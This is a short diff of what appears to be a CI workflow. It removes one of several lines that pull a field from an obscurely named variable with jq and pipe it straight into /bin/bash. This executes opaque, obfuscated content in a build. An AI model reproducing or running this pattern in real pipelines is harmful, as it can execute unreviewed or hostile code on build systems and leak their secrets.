@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$w3981" | jq -r .djd581 | /bin/bash
           echo $wlnet569 | jq -r .sgtv05 | /bin/bash
           echo $xop4864 | jq -r .zhxpl8352 | /bin/bash
-          echo $ayxx71977 | jq -r .tmhd966 | /bin/bash
           printf '%s' "$us2574" | jq -r .wdsnu0 | /bin/bash
 
       - name: Archive artifact
